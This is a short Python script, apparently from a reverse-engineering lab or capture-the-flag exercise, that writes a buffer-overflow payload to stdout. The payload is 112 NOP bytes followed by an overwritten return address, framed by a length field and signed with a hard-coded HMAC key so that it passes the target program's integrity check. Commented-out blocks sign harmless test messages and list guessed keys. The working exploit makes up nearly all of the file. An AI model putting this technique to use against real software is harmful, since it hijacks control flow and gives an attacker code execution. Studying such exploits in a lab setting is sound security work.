import sys
import hmac


key = 0xf4000ca0e36c93a5b2a7555b176d5852
nops = (0x90).to_bytes(1, 'little')
return_addr = (0x080496dd).to_bytes(4, 'little')
full_msg = (nops * 112) + (return_addr)
msg_len = len(full_msg)
sys.stdout.buffer.write(msg_len.to_bytes(4, 'little'))
sys.stdout.buffer.write(full_msg)
h = hmac.new(key.to_bytes(16, 'little'), full_msg, digestmod="SHA256")
sys.stdout.buffer.write(h.digest())

"""
# make ghidra rocks file
msg = ("Ghidra rocks!").encode('ascii')
msg_len = len(msg)
sys.stdout.buffer.write(msg_len.to_bytes(4, 'little'))
sys.stdout.buffer.write(msg)
h = hmac.new(key.to_bytes(16, 'little'), msg, digestmod="SHA256")
sys.stdout.buffer.write(h.digest())
"""

"""
# key = 0xffffd19c
# key = 0x176d5852b2a7555be36c93a5f4000ca0
key = 0xf4000ca0e36c93a5b2a7555b176d5852
msg = ("Hello, world!").encode('ascii')
msg_len = len(msg)
sys.stdout.buffer.write(msg_len.to_bytes(4, 'little'))
sys.stdout.buffer.write(msg)
h = hmac.new(key.to_bytes(16, 'little'), msg, digestmod="SHA256")
sys.stdout.buffer.write(h.digest())
"""